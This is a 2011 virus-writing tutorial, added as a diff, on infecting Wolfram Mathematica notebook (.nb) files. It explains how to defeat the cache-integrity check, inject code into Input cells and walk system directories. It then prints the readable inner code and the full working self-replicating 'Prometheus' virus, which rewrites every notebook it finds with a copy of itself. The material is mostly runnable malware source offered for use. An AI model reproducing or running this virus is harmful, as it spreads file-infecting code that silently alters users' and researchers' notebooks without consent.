@@ -1,0 +1,386 @@
+
+                *******************************************
+                    Infecting Mathematica Notebook files  
+                                  by Second Part To Hell
+                *******************************************
+
+
+
+  1) Introduction
+
+  2) Notebook file structure
+
+  3) Infection strategy
+  3.1) What can be infected?
+  3.2) Cache problems
+  3.3) Strict structure
+  3.4) General concept
+  3.5) Directory travelling
+
+  4) Inner Code
+
+  5) Running Virus
+
+  6) Conclusion
+
+
+
+
+
+
+
+  1) Introduction
+
+     Wolfram's Mathematica is one of the most wide spread computer algebra
+     program, used for instance in science, engineering, economics. Beside
+     of numerical solutions it also has the great capability to solve
+     problems analytically and create awesome dynamic graphical solutions.
+
+     Mathematica content is usually saved as .nb (Notebook) files, this is
+     exactly where we are starting now.
+
+
+
+
+
+
+
+  2) Notebook file structure
+
+     In contrast to many other script languages (such as JavaScript, Matlab,
+     PHP, F#, ...), the Mathematica Notebook files do have some kind of file
+     structure.
+     Beside of the mathematical formulars, these files also contain the whole
+     information about representation of the formulars.
+
+     The basic structure of Notebook files:
+
+     - - - - - - - - - - - - - - - - - -
+     Header
+
+     Internal cache information 1
+
+     Notebook Content
+
+     Internal cache information 2
+     - - - - - - - - - - - - - - - - - -
+
+
+     A basic file that contains
+
+         In: Sin[Pi]
+         Out: 0
+
+     - - - - - - - - - - - - - - - - - -
+(* Content-type: application/mathematica *)
+
+(*** Wolfram Notebook File ***)
+(* http://www.wolfram.com/nb *)
+
+(* CreatedBy='Mathematica 6.0' *)
+
+(*CacheID: 234*)
+(* Internal cache information:
+NotebookFileLineBreakTest
+NotebookFileLineBreakTest
+NotebookDataPosition[       145,          7]
+NotebookDataLength[      1306,         50]
+NotebookOptionsPosition[       989,         34]
+NotebookOutlinePosition[      1328,         49]
+CellTagsIndexPosition[      1285,         46]
+WindowFrame->Normal
+ContainsDynamic->False*)
+
+(* Beginning of Notebook Content *)
+Notebook[{
+
+Cell[CellGroupData[{
+Cell[BoxData[
+ RowBox[{"Sin", "[", "\[Pi]", "]"}]], "Input",
+ CellChangeTimes->{{3.3820752351875*^9, 3.382075235421875*^9}, 
+   3.38207533528125*^9, {3.382076319359375*^9, 3.382076411765625*^9}, {
+   3.382076510703125*^9, 3.3820765161875*^9}}],
+
+Cell[BoxData["0"], "Output",
+ CellChangeTimes->{{3.382076372609375*^9, 3.382076383125*^9}, 
+   3.382076415140625*^9, 3.3820765165625*^9}]
+}, Open  ]]
+},
+WindowSize->{616, 750},
+WindowMargins->{{0, Automatic}, {Automatic, 0}},
+FrontEndVersion->"6.0 for Microsoft Windows (32-bit) (June 19, 2007)",
+StyleDefinitions->"Default.nb"
+]
+(* End of Notebook Content *)
+
+(* Internal cache information *)
+(*CellTagsOutline
+CellTagsIndex->{}
+*)
+(*CellTagsIndex
+CellTagsIndex->{}
+*)
+(*NotebookFileOutline
+Notebook[{
+Cell[CellGroupData[{
+Cell[590, 23, 243, 4, 31, "Input"],
+Cell[836, 29, 137, 2, 30, "Output"]
+}, Open  ]]
+}
+]
+*)
+
+(* End of internal cache information *)
+
+     - - - - - - - - - - - - - - - - - -
+
+     We see that the header contains some type and version information. Next
+     thing is the "(*CacheID: 234*)"-line, this is important, we will come
+     back to that in a moment.
+
+     The first cache contains information about the overall file structure,
+     the second one contains size infos about each cell in the document.
+
+     The middle part (actually the only functional part) defines the structur
+     and content of the whole file.
+
+
+
+
+
+
+
+  3) Infection strategy
+
+  3.1) What can be infected?
+
+       That question can be transformed to "What is executed?". Beside of
+       some dynamic objects (which can perform some autostart behaviour, but
+       are restricted to not allow filesystem access - obvious Wolfram has
+       already thought loooong ago about the possibility of malware), the
+       only thing that are executed are Inputs by the user.
+
+       We can see such a "Input"-object in the example file above - here the
+       important lines:
+
+     - - - - - - - - - - - - - - - - - -
+           Cell[CellGroupData[{
+           Cell[BoxData[
+            RowBox[{"Sin", "[", "\[Pi]", "]"}]], "Input",
+            ...
+     - - - - - - - - - - - - - - - - - -
+       
+       OK - so simple: Copy our code to the string and finish? No!
+
+
+
+
+  3.2) Cache problems
+
+       The cache contains the exact pixel(?) information about every object
+       in the file. If we change just a single byte, next time the file is
+       loaded, Mathematica understands that the cache is not correct and
+       tells the user that the file has been changed outside of Mathematica.
+
+       Obviously we dont want that. There are two workarounds: Adjust the
+       cache information (probably quite hard) or removing the
+
+     - - - - - - - - - - - - - - - - - -
+           "(*CacheID: 234*)"
+     - - - - - - - - - - - - - - - - - -
+
+       line. Mathematica first checks if this line exists, then loads the
+       cache. So we simply change that line (in the example virus, I changed
+       it to the virus signature).
+
+       OK:Changing the line and copy our code to the string and finished? No!
+
+
+
+
+  3.3) Strict structure
+
+       Mathematica does not understand a plain string. All comments need to
+       have a specific structure.
+
+       Imagine we would like to add
+
+     - - - - - - - - - - - - - - - - - -
+       ToExpression[StringReplace["Print[XYZHello VXers!XYZ];",
+            {"XYZ" -> FromCharacterCode[34], "ABC" -> FromCharacterCode[92]}]]
+     - - - - - - - - - - - - - - - - - -
+
+       to our basic example file above. This is what we get (compare with the
+       simple three lines above):
+
+     - - - - - - - - - - - - - - - - - -
+       Cell[CellGroupData[{
+       Cell[BoxData[{
+        RowBox[{"Sin", "[", "\[Pi]", "]"}], "\[IndentingNewLine]", 
+        RowBox[{"ToExpression", "[", 
+         RowBox[{"StringReplace", "[", 
+          RowBox[{"\"\<Print[XYZHello VXers!XYZ];\>\"", ",", 
+           RowBox[{"{", 
+            RowBox[{
+             RowBox[{"\"\<XYZ\>\"", "\[Rule]", 
+              RowBox[{"FromCharacterCode", "[", "34", "]"}]}], ",", 
+             RowBox[{"\"\<ABC\>\"", "\[Rule]", 
+              RowBox[{"FromCharacterCode", "[", "92", "]"}]}]}], "}"}]}], "]"}], 
+         "]"}]}], "Input",
+         ...
+     - - - - - - - - - - - - - - - - - -
+
+       We need to make the correct structure, otherwise Mathematice won't run
+       the Input.
+
+
+
+
+  3.4) General concept
+
+       We can save the whole code as a string and run it via
+     - - - - - - - - - - - - - - - - - -
+          MyCode="MY_WHOLE_CODE_AS_STRING";
+          ToExpression[MyCode]
+     - - - - - - - - - - - - - - - - - -
+
+       This has two advantages:
+
+           1) We don't need to read the virus content from a file as we can
+              access the MyCode-String.
+
+           2) The Notebook-structure of a string is constant. We can write as
+              much into the string as we want, there is no additional
+              structure for the content. Therefore we can just copy the
+              content of the stucture before and after the string as constant
+              string.
+
+       For a possible victim file, we use one of the existing "Input"-object
+       to append our code. The new infected file looks like this:
+
+           -> Code before infection-position
+              -> Structure before the virus-string
+              -> constant virus string
+              -> Structure after the virus-string
+           -> Code after infection-position
+
+       One additional thing we have to check: If the victim-"Input"-object
+       just contains one single line, we have to add an "{" and a "}" after
+       'Cell[BoxData[' and before '], "Input"' respectivly.
+
+       So: Changing the cache, including syntactically correct virus-body and
+           change some structure things - now finished? YES! :)
+
+
+
+
+  3.5) Directory travelling
+
+       Infecting the current directory is nice, but as Mathematica provides
+       several other system directories, we can find more files very easily.
+
+     - - - - - - - - - - - - - - - - - -
+       DirList:=Join[$Path,List[$InitialDirectory,ParentDirectory[],
+                                $HomeDirectory,$BaseDirectory,
+                                $InstallationDirectory,$UserBaseDirectory,
+                                $UserDocumentsDirectory,NotebookDirectory[]]]
+       For[j=1,j<=Length[DirList],j++,
+               SetDirectory[DirList[[j]]];
+               ...
+          ]
+     - - - - - - - - - - - - - - - - - -
+
+
+
+
+
+
+
+  4) Inner Code
+
+     The actual virus is optimized and in a string - thus hard to read.
+     Therefore here the inner code. (Obviously it is not spreading the virus
+     code, because it would need its own code in the "Prometheus"-string.)
+
+     - - - - - - - - - - - - - - - - - -
+Prometheus:="Print[XYZHello VXers!XYZ];"
+
+PreProMeth:=StringReplace[",xYzaBc[IndentingNewLine]xYz,RowBox[{RowBox[{xYzPrometheusxYz,xYz:=xYz,xYzaBcxYzaBc<",{"xYz"->FromCharacterCode[34],"aBc"->FromCharacterCode[92]}];
+PostProMeth:=StringReplace["aBc>aBcxYzxYz}],xYz;xYz,RowBox[{xYzToExpressionxYz,xYz[xYz,RowBox[{xYzStringReplacexYz,xYz[xYz,RowBox[{xYzPrometheusxYz,xYz,xYz,RowBox[{xYz{xYz,RowBox[{RowBox[{RowBox[{xYzaBcxYzaBc<XYaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<ZaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz34xYz,xYz]xYz}]}],xYz,xYz,RowBox[{RowBox[{xYzaBcxYzaBc<ABaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<CaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz92xYz,xYz]xYz}]}]}],xYz}xYz}]}],xYz]xYz}],xYz]xYz}]}]",{"xYz"->FromCharacterCode[34],"aBc"->FromCharacterCode[92]}];
+DirList:=Join[$Path,List[$InitialDirectory,ParentDirectory[],$HomeDirectory,$BaseDirectory,$InstallationDirectory,$UserBaseDirectory,$UserDocumentsDirectory,NotebookDirectory[]]]
+For[j=1,j<=Length[DirList],j++,
+        SetDirectory[DirList[[j]]];
+        FileList:=FileNames["*.nb"];
+        For[i=1,i<=Length[FileList],i++,
+                VictimCode=FromCharacterCode[BinaryReadList[FileList[[i]]]];
+                If[StringCount[VictimCode,"Prometheus"]==0,
+                        VictimCode=StringReplace[VictimCode,"(*CacheID:"->"(*Prometheus"];
+                        CacheStrPos=StringPosition[VictimCode,"(* Internal cache information *)"];
+                        If[Length[CacheStrPos]>0,
+                                VictimCode=StringTake[VictimCode,CacheStrPos[[1]][[1]]-1] 
+                        ];
+                        PossibleInfPlaces=StringPosition[VictimCode,"], "<>FromCharacterCode[34]<>"Input"<>FromCharacterCode[34]];
+                        If[Length[PossibleInfPlaces]>0,
+                                InfPos=RandomInteger[{1,Length[PossibleInfPlaces]}];
+                                InfPlace=PossibleInfPlaces[[InfPos]][[1]]-1;
+                                If[StringTake[VictimCode,{InfPlace}]!="}",
+                                        tmpPre=StringTake[VictimCode,InfPlace];
+                                        tmpPost=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[tmpPre])];
+                                        PosOfDataBox=StringPosition[tmpPre,"Cell[BoxData["];
+                                        tmpPre=StringTake[tmpPre,Last[PosOfDataBox][[2]]]<>"{"<>StringTake[tmpPre,-(StringLength[tmpPre]-Last[PosOfDataBox][[2]])];
+                                        VictimCode=tmpPre<>"}"<>tmpPost;
+                                        InfPlace=InfPlace+2;
+                                ];
+                                InfPlace=InfPlace-1;
+                                PreInf=StringTake[VictimCode,InfPlace];
+                                PostInf=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[PreInf])];
+                                InfectedCode=PreInf<>PreProMeth<>Prometheus<>PostProMeth<>PostInf;
+                                BinaryWrite[FileList[[i]],ToCharacterCode[InfectedCode]];
+                                Close[FileList[[i]]];
+                                ProMList=List["Here I sit, forming people","In my image;","A race, to be like me,","To suffer, to weep,","To enjoy and delight themselves,","And to mock you \[Dash]","As I do!"];
+                                If[RandomInteger[5]==3,Print[ProMList[[RandomInteger[6]+1]]]]
+                        ]
+                ];
+        ]
+]
+     - - - - - - - - - - - - - - - - - -
+
+
+
+
+
+
+
+  5) Running Virus
+
+     Here we are :)
+
+     - - - - - - - - - - - - - - - - - -
+Prometheus:="PreProMeth:=StringReplace[XYZ,xYzaBc[IndentingNewLine]xYz,RowBox[{RowBox[{xYzPrometheusxYz,xYz:=xYz,xYzaBcxYzaBc<XYZ,{XYZxYzXYZ->FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[92]}];PostProMeth:=StringReplace[XYZaBc>aBcxYzxYz}],xYz;xYz,RowBox[{xYzToExpressionxYz,xYz[xYz,RowBox[{xYzStringReplacexYz,xYz[xYz,RowBox[{xYzPrometheusxYz,xYz,xYz,RowBox[{xYz{xYz,RowBox[{RowBox[{RowBox[{xYzaBcxYzaBc<XYaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<ZaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz34xYz,xYz]xYz}]}],xYz,xYz,RowBox[{RowBox[{xYzaBcxYzaBc<ABaBc>aBcxYzxYz,xYz<>xYz,xYzaBcxYzaBc<CaBc>aBcxYzxYz}],xYzaBc[Rule]xYz,RowBox[{xYzFromCharacterCodexYz,xYz[xYz,xYz92xYz,xYz]xYz}]}]}],xYz}xYz}]}],xYz]xYz}],xYz]xYz}]}]XYZ,{XYZxYzXYZ->FromCharacterCode[34],XYZaBcXYZ->FromCharacterCode[92]}];DirList:=Join[$Path,List[$InitialDirectory,ParentDirectory[],$HomeDirectory,$BaseDirectory,$InstallationDirectory,$UserBaseDirectory,$UserDocumentsDirectory,NotebookDirectory[]]];For[j=1,j<=Length[DirList],j++,SetDirectory[DirList[[j]]];FileList:=FileNames[XYZ*.nbXYZ];For[i=1,i<=Length[FileList],i++,VictimCode=FromCharacterCode[BinaryReadList[FileList[[i]]]];If[StringCount[VictimCode,XYZPrometheusXYZ]==0,VictimCode=StringReplace[VictimCode,XYZ(*CacheID:XYZ->XYZ(*PrometheusXYZ];CacheStrPos=StringPosition[VictimCode,XYZ(* Internal cache information *)XYZ];If[Length[CacheStrPos]>0,VictimCode=StringTake[VictimCode,CacheStrPos[[1]][[1]]-1]];PossibleInfPlaces=StringPosition[VictimCode,XYZ], XYZ<>FromCharacterCode[34]<>XYZInputXYZ<>FromCharacterCode[34]];If[Length[PossibleInfPlaces]>0,InfPos=RandomInteger[{1,Length[PossibleInfPlaces]}];InfPlace=PossibleInfPlaces[[InfPos]][[1]]-1;If[StringTake[VictimCode,{InfPlace}]!=XYZ}XYZ,tmpPre=StringTake[VictimCode,InfPlace];tmpPost=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[tmpPre])];PosOfDataBox=StringPosition[tmpPre,XYZCell[BoxData[XYZ];tmpPre=StringTake[tmpPre,Last[PosOfDataBox][[2]]]<>XYZ{XYZ<>StringTake[tmpPre,-(StringLength[tmpPre]-Last[PosOfDataBox][[2]])];VictimCode=tmpPre<>XYZ}XYZ<>tmpPost;InfPlace=InfPlace+2;];InfPlace=InfPlace-1;PreInf=StringTake[VictimCode,InfPlace];PostInf=StringTake[VictimCode,-(StringLength[VictimCode]-StringLength[PreInf])];InfectedCode=PreInf<>PreProMeth<>Prometheus<>PostProMeth<>PostInf;BinaryWrite[FileList[[i]],ToCharacterCode[InfectedCode]];Close[FileList[[i]]];ProMList=List[XYZHere I sit, forming peopleXYZ,XYZIn my image;XYZ,XYZA race, to be like me,XYZ,XYZTo suffer, to weep,XYZ,XYZTo enjoy and delight themselves,XYZ,XYZAnd to mock you ABC[Dash]XYZ,XYZAs I do!XYZ];If[RandomInteger[5]==3,Print[ProMList[[RandomInteger[6]+1]]]]]];]]";
+ToExpression[StringReplace[Prometheus,{"XYZ"->FromCharacterCode[34],"ABC"->FromCharacterCode[92]}]]
+     - - - - - - - - - - - - - - - - - -
+
+
+
+
+
+
+
+  6) Conclusion
+
+     Obviously Wolfram Reseach has thought long about malware for
+     Mathematica:
+
+
+        "Mathematica includes security systems that advise the user
+         when such an evaluation is about to take place for the first
+         time in a given notebook and allow the user to intervene and
+         prevent any dynamic evaluations in that notebook."
+                           from http://www.wolfram.com/technology/nb/
+
+
+     As far as I know, there is nothing out there so far.
+     I'm happy that now I could satisfy their prediction! :)
+
+                                                          Second Part To Hell                                                               
+                                                                   March 2011
